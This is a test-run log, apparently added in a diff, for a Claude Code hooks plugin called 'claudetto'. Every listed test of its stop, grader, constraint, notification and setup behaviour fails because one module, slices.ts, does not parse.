+  claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+  claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+  claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+  claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+  claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+  claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+  claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+
+hooks/limits/stop.test.ts:
+(fail) a block after a stretch with no write ends the turn and names /goal clear [160.29ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a block after a stretch that wrote passes unchanged, every time [72.41ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a write, a block, then a stretch with no write ends at the second block [47.35ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a stretch whose only progress is Bash ends at the first block [124.17ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a read-only stretch ends at the first block [64.33ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a denied write leaves the flag clear [52.87ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a write that failed leaves the flag clear [69.04ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a block of the user's own Stop hook is stopped the same way [118.03ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the open-items block is not stopped [58.45ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a stall stop comes before the open-items check [34.68ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a Stop that nothing blocks changes nothing [44.27ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a changed list of background tasks is added once [47.08ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a monitor that still runs at Stop is listed in the reply [82.41ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) each task in flight is listed, not only the first [116.37ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a Stop with nothing in flight, or with no list, adds no additionalContext [75.21ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a Stop that a stop hook already continued adds nothing even with a task in flight [61.16ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a Stop adds no budget line, since that text would continue the turn [27.05ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a task whose status changed is listed again, and a new task joins the list [27.48ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a file written between the blocks starts the stretch again [114.46ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a Stop that nothing blocks starts the count again [60.82ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+
+hooks/limits/verify.test.ts:
+(fail) a claim about the work with no tool this turn gets one block [130.53ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a turn that read the workspace is not offered the unchecked-claim or rules faults [96.92ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a reply the grader finds no fault in passes [92.19ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the credited fault blocks once with its own fix [56.48ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the rules fault blocks once with its own fix [112.23ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the unfiled fault blocks once with its own fix [36.77ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the fallback fault blocks once with its own fix [68.82ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) several faults make one block that holds each fix [38.72ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a fault whose quote is not in the reply passes [89.89ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a fault whose code the turn ruled out passes [39.10ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a grader call that is fail passes [48.98ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a grader call that is unanswered passes [62.92ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a grader call that is not json passes [44.07ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a turn that wrote the issues file is not offered the unfiled fault [106.33ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the grader sees the earlier person and assistant messages [60.93ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a turn with tool output is also graded by sonnet for the unseen fault, which sees the output [99.36ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a turn with no tool output makes one call and cannot raise the unseen fault [45.27ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the grader sees the latest 8 tool results, 400 characters each [28.45ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+
+hooks/notify.test.ts:
+(fail) a stop that an error ended raises one notice naming the error [140.97ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) notificationsEnabled false raises none [117.36ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a Notification raises no notice of its own [57.23ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+
+hooks/pin.test.ts:
+(fail) a constraint found on one prompt rides the next prompt as context, and the first prompt is not held for it [124.36ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) no constraint adds no context [109.39ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) read-only denies Edit, Write and writing Bash and lets reads through [72.35ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) no-commit denies git commit only [93.07ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) only-files denies an edit of another file [59.67ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the prior messages reach the extractor even when a message has no toolResults field [85.94ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the extractor is told that a file to change or a claim about the code is not a constraint [100.31ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) no-questions denies both ask tools, before delegation answers them, and nothing else [76.72ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a remark's first tool call, a read-only one too, is denied with the answer-first text [78.93ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a question's first call is denied, and so is a sibling call of the same batch [67.46ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a remark's call passes once assistant text precedes it in the turn [45.41ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) text from before the person's message does not count as an answer [34.41ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a task message is never held for an answer [30.19ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) an unreadable kind leaves the message a task [29.72ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) an ask is denied until the newest ISSUES file is read, and the deny names it [22.28ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) reading only an older ISSUES file leaves the ask denied [20.22ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a successful Read of the newest ISSUES file, by absolute path, lets the ask pass [33.06ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a relative path counts too [23.10ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a failed Read of the newest ISSUES file does not count [34.87ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) no ISSUES file at the root, no gate on the ask [27.16ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the call that retries after the deny passes once, with no text, because the turn has moved on [20.98ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+
+hooks/setup.test.ts:
+(fail) setup on an empty file writes the telemetry env and the eight denies and no Agent deny [157.42ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a cache variable the user sets adds its folder to the sandbox's allowWrite [123.38ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) with no cache variable set, the sandbox's allowWrite holds nothing extra [66.55ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a settings file that is not a JSON object is left as it is [81.74ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a dismissed dialog writes nothing and says so [79.59ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a Skip on every group writes no settings file [46.38ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a second run with everything in place asks nothing and writes nothing [55.80ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the ignore dialog says it narrows Grep and not Glob [42.10ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) bare /statusline writes the line with no model turn, keeping other keys [36.37ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /statusline keeps a status line the user set and says so [26.60ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /statusline run twice writes the file once [33.46ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /statusline on a file that is not a JSON object writes nothing and names it [28.55ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a /statusline write that fails says so [21.00ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /statusline with text goes on to the built-in command [37.61ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) /statusline is described as making no model call [23.03ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a startup below the version floor logs a line naming claude update [20.45ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the floor itself logs nothing about the version [20.75ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a startup without ast-grep logs one notice, and the second logs none [16.47ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) each rule the user lacks is a dialog of its own [19.56ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a rule the user already holds is not offered [31.95ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) Write puts the shipped text under rules/claudetto and writes no settings key [20.58ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a dismissed rule dialog stops the rest and says so [19.40ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a shipped rule changed after setup wrote it is logged as updated, once [24.20ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) an edited copy is logged as modified even when the shipped file has the newer date [19.88ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a copy with no saved hash that differs is logged as modified [19.06ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) an unchanged copy logs nothing [18.37ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a rule never installed logs nothing [18.93ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) session.start registers no setup tool [18.72ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the command answers with text alone, so the model gets no turn [18.97ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) each dialog offers two to four labels [18.41ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) no dialog header, label, or description holds a character drawn as `�` [18.92ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) only the chosen group is written to the user settings file [18.39ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a full write holds no agent key [18.38ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a repo with neither memory file is shown the starter files, and a Write writes them [24.72ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a Skip writes no starter file [20.83ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a repo with an AGENTS.md is offered no starter file [20.59ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a file that appears after the starter question is not overwritten [24.58ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a Write puts the block after the user's lines, and the dialog shows the file diff [24.19ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a Skip writes no ignore file [22.47ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a repo with an AGENTS.md is still offered the ignore files [20.49ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a folder that is not a git repo is offered nothing [21.82ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a settled repo is asked nothing, and a rerun changes no byte [18.58ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a Yes shows the brew command and then runs it [18.87ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a No runs nothing and records the pinned version [29.24ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a startup without betterleaks logs its notice every time, and records nothing [23.95ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a No to betterleaks records nothing and names the install step [21.12ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a dismissed install question runs nothing and records nothing [20.83ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a platform with no package manager gets the releases page, and nothing runs [23.57ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) ast-grep on the PATH asks and says nothing [21.65ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) the startup notice names the install command and /claudetto:setup [21.00ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a changed pin shows the notice again [22.83ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) ast-grep on the PATH logs nothing at startup [23.00ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) a resume logs neither the notice nor the version [18.04ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) 2.1.315 at startup warns, compared by numeric parts [21.61ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) 2.1.311-dev at startup warns, compared by numeric parts [16.28ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) 2.1.320 at startup adds no line, compared by numeric parts [23.44ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) 2.1.1000 at startup adds no line, compared by numeric parts [19.27ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) 2.2.0 at startup adds no line, compared by numeric parts [20.46ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) 3.0.0 at startup adds no line, compared by numeric parts [18.87ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) dev at startup adds no line, compared by numeric parts [16.19ms]
+  HooksError: claudetto: hooks module did not load: /Users/krystian/CodeProjects/xsyetopz/claudetto/plugins/claudetto/hooks/slices.ts does not parse: Unexpected | (line 17, column 7)
+(fail) setup writes the same minimumVersion that the startup floor warns on [24.72ms]
